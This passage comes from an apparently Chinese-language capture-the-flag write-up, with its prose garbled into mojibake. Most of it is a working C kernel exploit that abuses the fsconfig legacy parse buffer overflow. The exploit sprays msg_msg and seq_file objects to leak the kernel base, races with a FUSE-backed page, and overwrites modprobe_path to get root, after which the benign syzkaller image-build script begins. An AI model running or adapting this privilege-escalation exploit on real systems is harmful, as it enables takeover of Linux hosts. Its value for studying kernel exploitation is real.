class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fuse_operations</span> <span class="title">evil_ops</span> =</span> &#123;</span><br><span class="line">    .getattr = evil_getattr,</span><br><span class="line">    .readdir = evil_readdir,</span><br><span class="line">    .read = evil_read,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x20</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr = <span class="number">-1</span>; <span class="comment">// single_start</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *evil_args[] = &#123;<span class="string">&quot;exploit&quot;</span>, <span class="string">&quot;./temp&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    evil_args[<span class="number">0</span>] = argv[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fs_fd[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">char</span> m_ts_buf[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">int</span> seq_fd[SEQ_FILE_NUM];</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    unshare_setup(getuid(), getgid());</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_fd) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to open pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fuse_main(<span class="keyword">sizeof</span>(evil_args) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *) - <span class="number">1</span>, evil_args,</span><br><span class="line">                      &amp;evil_ops, <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;[-] FAILED to create FUSE!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ms_qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ms_qid &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&quot;\x00&quot;</span>, <span class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        ret = msgsnd(ms_qid, &amp;primary_msg, <span class="number">0xfd0</span> - <span class="number">8</span>, MSG_TAG);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ret);</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (msqid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray msg_msg in half of message queues and seq_files...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM / <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&#x27;A&#x27;</span> + i, <span class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        ret = msgsnd(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, MSG_TAG);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ret);</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fs_fd[<span class="number">0</span>] = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd[<span class="number">0</span>] &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to fsopen!&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">        fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;aaaaaaa&quot;</span>, <span class="string">&quot;bbbbbbb&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;0x196082&quot;</span>, <span class="string">&quot;pwned&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = MSG_QUEUE_NUM / <span class="number">2</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&#x27;A&#x27;</span> + i, <span class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, MSG_TAG) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] oob write to overwrite m_ts of one msg_msg...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(m_ts_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(m_ts_buf));</span><br><span class="line">    *((<span class="keyword">long</span> *)m_ts_buf) = <span class="number">0xfd0</span> + <span class="number">0xff0</span>;</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;196082196082196082ya7&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd[<span class="number">0</span>], FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, m_ts_buf, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray more seq_operations...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = MSG_QUEUE_NUM; i &lt; SEQ_FILE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to open /proc/self/stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for oob reading...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> recv_size;</span><br><span class="line">        <span class="comment">// memset(buf, &#x27;\0&#x27;, 0xfd0 + 0xfd0);</span></span><br><span class="line">        recv_size = msgrcv(msqid[i], buf, <span class="number">0xfd0</span> + <span class="number">0xff0</span> - <span class="number">8</span> + <span class="number">0x10</span>, <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">        <span class="keyword">if</span> (recv_size &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error code :%d\n&quot;</span>, recv_size);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error index:%d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to msgrcv(MSG_COPY)!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (recv_size == (<span class="number">0xfd0</span> + <span class="number">0x18</span>))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; (<span class="number">0xfd0</span> + <span class="number">0xfd0</span>); j += <span class="number">8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)(buf + j) &gt; kernel_base &amp;&amp; (*(<span class="keyword">uint64_t</span> *)(buf + j) &amp; <span class="number">0xfff</span>) == <span class="number">0x140</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] get data leak: %p\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)(buf + j));</span><br><span class="line">                kernel_addr = *(<span class="keyword">uint64_t</span> *)(buf + j);</span><br><span class="line">                kernel_base = kernel_addr - <span class="number">0x36f140</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kernel_addr != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_addr == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to leak kernel base!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    modprobe_path = <span class="number">0xffffffff82891780</span> + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] modprobe_path: %lx\n&quot;</span>, modprobe_path);</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[<span class="number">1</span>], &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    prepare_mod();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> evil_file_fd;</span><br><span class="line">    <span class="keyword">int</span> ms_qid;</span><br><span class="line"></span><br><span class="line">    evil_file_fd = open(<span class="string">&quot;./temp/evil&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (evil_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to open evil file in FUSE!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *nearby_page = (<span class="keyword">char</span> *)mmap((<span class="keyword">void</span> *)<span class="number">0x1337000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *evil_page = (<span class="keyword">char</span> *)mmap((<span class="keyword">void</span> *)<span class="number">0x1338000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                                   MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (evil_page != (<span class="keyword">char</span> *)<span class="number">0x1338000</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to map for FUSE file!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(nearby_page, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;try %d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((ms_qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        exp_fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (exp_fs_fd &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to fsopen!&quot;</span>);</span><br><span class="line">        <span class="comment">// write(pipe_fd[1], &amp;exp_fs_fd, 4);</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++)</span><br><span class="line">            fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;aaaaaaa&quot;</span>, <span class="string">&quot;bbbbbbb&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;0x196082&quot;</span>, <span class="string">&quot;pwned&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">pthread_t</span> thr;</span><br><span class="line">        pthread_create(&amp;thr, <span class="literal">NULL</span>, change_next, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(ms_qid, evil_page - <span class="number">0xfd0</span> + <span class="number">0x8</span>, <span class="number">0xfd0</span> + <span class="number">0x18</span>, MSG_TAG) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        pthread_join(thr, <span class="literal">NULL</span>);</span><br><span class="line">        i++;</span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (flag_fd &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Successfully overwrite the modprobe_path!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¸©å‘è®°"><a href="#è¸©å‘è®°" class="headerlink" title="è¸©å‘è®°"></a>è¸©å‘è®°</h3><p>é¦–å…ˆåœ¨è™šæ‹Ÿæœºä¸­è·‘<code>FUSE</code>æ—¶è¸©äº†ä¸€ä¸ªå¤§å‘ï¼Œåœ¨ä¸€ç¯‡æ–‡ç« ä¸­( è¿™é‡Œæåˆ°çš„æ–‡ç« å°±ä¸æ”¾å‡ºæ¥äº†ï¼Œå¯èƒ½æ˜¯å¸ˆå‚…ä»¬ä¸å°å¿ƒå†™é”™äº† )æŒ‡å‡º<code>FUSE</code>æ— æ³•åœ¨ctfç¯å¢ƒä¸­è¿è¡Œæ˜¯å› ä¸º<code>bzImage</code>çš„é—®é¢˜ï¼Œç»è¿‡è¯¢é—®å‘ç°å…¶é—®é¢˜ä¸»è¦æ˜¯æ–‡ä»¶ç³»ç»Ÿè¿‡äºæ®‹ç¼ºå¯¼è‡´çš„ã€‚éšåå¬å–a3ä½¬çš„æ„è§æ›´å¤šçš„å­¦ä¹ äº†fuseåŸç†ä¹‹åæˆåŠŸè§£å†³äº†é—®é¢˜ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>syzkaller</code>ä¸­çš„å·¥å…·ä½¿ç”¨<code>debootstrap</code>æ­å»ºçš„ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># Copyright 2016 syzkaller project authors. All rights reserved.</span></span><br><span class="line"><span class="comment"># Use of this source code is governed by Apache 2 LICENSE that can be found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create-image.sh creates a minimal Debian Linux image suitable for syzkaller.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eux</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a minimal Debian distribution in a directory.</span></span><br><span class="line">DIR=chroot</span><br><span class="line">PREINSTALL_PKGS=openssh-server,curl,tar,gcc,libc6-dev,time,strace,sudo,less,psmisc,selinux-utils,policycoreutils,checkpolicy,selinux-policy-default,firmware-atheros,debian-ports-archive-keyring,libselinux1-dev,fuse3,libfuse3-3,libfuse3-dev,libfuse2,libfuse-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># If ADD_PACKAGE is not defined as an external environment variable, use our default packages</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$&#123;ADD_PACKAGE+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">    ADD_PACKAGE=<span class="string">&quot;make,sysbench,git,vim,tmux,usbutils,tcpdump&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Variables affected by options</span></span><br><span class="line">ARCH=$(uname -m)</span><br><span class="line">RELEASE=bullseye</span><br><span class="line">FEATURE=minimal</span><br><span class="line">SEEK=2047</span><br><span class="line">PERF=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Display help function</span></span><br><span class="line"><span class="function"><span class="title">display_help</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> [option...] &quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -a, --arch                 Set architecture&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -d, --distribution         Set on which debian distribution to create&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -f, --feature              Check what packages to install in the image, options are minimal, full&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -s, --seek                 Image size (MB), default 2048 (2G)&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -h, --help                 Display help message&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;   -p, --add-perf             Add perf support with this option enabled. Please set envrionment variable \$KERNEL at first&quot;</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$#</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">        -h | --<span class="built_in">help</span>)</span><br><span class="line">            display_help</span><br><span class="line">            <span class="built_in">exit</span> 0</span><br><span class="line">        ;;</span><br><span class="line">        -a | --arch)</span><br><span class="line">            ARCH=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -d | --distribution)</span><br><span class="line">            RELEASE=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -f | --feature)</span><br><span class="line">            FEATURE=<span class="variable">$2</span></span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -s | --seek)</span><br><span class="line">            SEEK=$((<span class="variable">$2</span> - <span class="number">1</span>))</span><br><span class="line">            <span class="built_in">shift</span> 2</span><br><span class="line">        ;;</span><br><span class="line">        -p | --add-perf)</span><br><span class="line">            PERF=<span class="literal">true</span></span><br><span class="line">            <span class="built_in">shift</span> 1</span><br><span class="line">        ;;</span><br><span class="line">        -*)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Error: Unknown option: <span class="variable">$1</span>&quot;</span> &gt;&amp;2</span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">        ;;</span><br><span class="line">        *)  <span class="comment"># No more options</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Handle cases where qemu and Debian use different arch names</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$ARCH</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    ppc64le)</span><br><span class="line">        